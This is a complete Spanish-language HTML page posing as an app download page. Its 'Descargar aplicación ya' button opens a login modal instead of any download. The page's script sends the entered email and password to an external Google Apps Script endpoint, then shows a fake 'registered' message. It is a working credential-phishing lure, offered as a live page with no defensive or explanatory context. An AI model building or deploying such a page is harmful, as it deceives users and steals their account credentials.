<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Descargar Aplicación</title>
<style>
  body { font-family: 'Arial', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .container { text-align: center; }
  .btn { padding: 14px 28px; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; }
  .btn:hover { background: #0056b3; }
  .modal { display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; }
  .modal-content { background: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); text-align: center; }
  .input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #ccc; font-size: 16px; }
  .loading { display: none; margin-top: 15px; color: #007bff; font-weight: bold; }
</style>
</head>
<body>

<div class="container">
  <button class="btn" onclick="abrirModal()">Descargar aplicación ya</button>
</div>

<div class="modal" id="modal">
  <div class="modal-content">
    <h2>Iniciar sesión</h2>
    <input type="text" id="correo" class="input" placeholder="Correo">
    <input type="password" id="contrasena" class="input" placeholder="Contraseña">
    <button class="btn" onclick="registrar()">Registrar</button>
    <div class="loading" id="loading">Cargando...</div>
  </div>
</div>

<script>
const url = "https://script.google.com/macros/s/AKfycbzglYgk0ctQm0b8d_mkuIYReSW3tVO9CAxf61AtzXnP5yoN07p7pavLIKhuHPOreTSw/exec";

function abrirModal() {
  document.getElementById("modal").style.display = "flex";
}

function registrar() {
  const correo = document.getElementById("correo").value.trim();
  const contrasena = document.getElementById("contrasena").value.trim();
  const loading = document.getElementById("loading");

  if(!correo || !contrasena){
    alert("Por favor completa ambos campos");
    return;
  }

  loading.style.display = "block";

  fetch(url, {
    method: "POST",
    body: JSON.stringify({ correo: correo, contrasena: contrasena }),
    headers: { 'Content-Type': 'application/json' }
  })
  .then(res => res.json())
  .then(res => {
    setTimeout(() => {
      loading.style.display = "none";
      document.getElementById("correo").value = "";
      document.getElementById("contrasena").value = "";
      document.getElementById("modal").style.display = "none";

      if(res.result === "success"){
        alert("¡Registrado correctamente!");
      } else {
        alert("Error al registrar: " + res.message);
      }
    }, 2000);
  })
  .catch(err => {
    console.error(err);
    loading.style.display = "none";
    alert("Error al conectar con Google Sheets");
  });
}

// Cerrar modal al hacer clic fuera del contenido
window.onclick = function(event){
  const modal = document.getElementById("modal");
  if(event.target == modal){
    modal.style.display = "none";
  }
}
</script>

</body>
</html>
